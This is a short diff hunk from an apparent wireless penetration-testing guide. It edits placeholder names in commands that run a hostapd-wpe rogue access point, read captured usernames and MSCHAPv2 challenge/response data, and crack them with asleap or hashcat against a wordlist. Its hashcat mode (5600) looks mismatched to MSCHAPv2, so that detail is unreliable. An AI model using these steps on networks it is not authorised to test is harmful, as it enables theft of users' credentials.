@@ -82,12 +82,12 @@ sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
 
 # Captured credentials logged to:
 cat /var/log/hostapd-wpe.log
-# Contains: username, MSCHAPv2 challenge/response
+# Contains: username and MSCHAPv2 exchange data
 
 # Crack MSCHAPv2 → NTLM hash
-# asleap -C <challenge> -R <response> -W rockyou.txt
-# OR extract NT hash from challenge/response pair:
-hashcat -m 5600 "username:::challenge:response:" rockyou.txt
+# asleap -C <mschap_chal> -R <mschap_resp> -W rockyou.txt
+# OR extract NT hash from the MSCHAP exchange pair:
+hashcat -m 5600 "username:::<mschap_chal>:<mschap_resp>:" rockyou.txt
 
 # Or use chapcrack / mschapv2-offline-attack
 ```
